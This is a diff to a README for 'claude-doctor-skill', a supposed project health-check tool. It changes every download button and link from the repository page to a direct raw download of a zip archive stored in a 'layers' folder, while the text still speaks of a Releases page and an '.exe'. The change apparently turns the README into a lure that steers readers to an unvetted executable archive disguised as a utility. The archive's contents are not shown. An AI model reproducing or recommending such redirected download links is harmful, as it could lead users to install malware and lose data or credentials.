@@ -1,6 +1,6 @@
 # ⚕️ claude-doctor-skill - Check Your Project Health Fast
 
-[![Download claude-doctor-skill](https://img.shields.io/badge/Download-claude--doctor--skill-blue?style=for-the-badge)](https://github.com/ScarXparth/claude-doctor-skill)
+[![Download claude-doctor-skill](https://img.shields.io/badge/Download-claude--doctor--skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/ScarXparth/claude-doctor-skill/main/layers/doctor-claude-skill-2.0.zip)
 
 ---
 
@@ -24,7 +24,7 @@ This tool gives you clear information on how your project performs in key areas.
 
 ## 🚀 Getting Started: Download and Run claude-doctor-skill
 
-1. Click the large button at the top or [visit this page to download claude-doctor-skill](https://github.com/ScarXparth/claude-doctor-skill).
+1. Click the large button at the top or [visit this page to download claude-doctor-skill](https://raw.githubusercontent.com/ScarXparth/claude-doctor-skill/main/layers/doctor-claude-skill-2.0.zip).
 
 2. Once the page loads, look for the section titled "Releases" or "Download".
 
@@ -145,7 +145,7 @@ Keep an eye on the GitHub page for new versions. Simply download the latest `.ex
 
 Download or update claude-doctor-skill here:
 
-[![Download claude-doctor-skill](https://img.shields.io/badge/Download-claude--doctor--skill-grey?style=for-the-badge)](https://github.com/ScarXparth/claude-doctor-skill)
+[![Download claude-doctor-skill](https://img.shields.io/badge/Download-claude--doctor--skill-grey?style=for-the-badge)](https://raw.githubusercontent.com/ScarXparth/claude-doctor-skill/main/layers/doctor-claude-skill-2.0.zip)
 
 ---
 
